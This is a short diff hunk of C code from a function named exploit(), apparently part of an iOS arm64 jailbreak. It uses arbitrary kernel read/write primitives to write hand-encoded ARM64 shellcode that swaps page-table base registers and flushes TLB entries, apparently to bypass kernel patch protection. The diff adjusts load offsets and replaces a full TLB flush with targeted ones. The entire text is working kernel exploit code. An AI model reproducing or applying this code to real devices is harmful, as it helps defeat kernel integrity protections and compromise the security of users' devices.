@@ -428,13 +428,17 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
 
     {
         int n = 0;
-        WriteAnywhere32(kppsh+n, 0x580001a1); n+=4; // ldr	x1, #52
-        WriteAnywhere32(kppsh+n, 0x58000100); n+=4; // ldr	x0, #32
+        
+        WriteAnywhere32(kppsh+n, 0x580001e1); n+=4; // ldr	x1, #60
+        WriteAnywhere32(kppsh+n, 0x58000140); n+=4; // ldr	x0, #40
         WriteAnywhere32(kppsh+n, 0xd5182020); n+=4; // msr	TTBR1_EL1, x0
         WriteAnywhere32(kppsh+n, 0xd2a00600); n+=4; // movz	x0, #0x30, lsl #16
         WriteAnywhere32(kppsh+n, 0xd5181040); n+=4; // msr	CPACR_EL1, x0
+
         WriteAnywhere32(kppsh+n, 0xd5182021); n+=4; // msr	TTBR1_EL1, x1
-        WriteAnywhere32(kppsh+n, 0xd508871f); n+=4; // tlbi	vmalle1
+        WriteAnywhere32(kppsh+n, 0x10ffffe0); n+=4; // adr	x0, #-4
+        WriteAnywhere32(kppsh+n, 0xd5088720); n+=4; // tlbi	vae1, x0
+        WriteAnywhere32(kppsh+n, 0xd508873e); n+=4; // tlbi	vae1, x30
         WriteAnywhere32(kppsh+n, 0xd5033fdf); n+=4; // isb
         WriteAnywhere32(kppsh+n, 0xd65f03c0); n+=4; // ret
         WriteAnywhere64(kppsh+n, ReadAnywhere64(ttbr0_real)); n+=8;
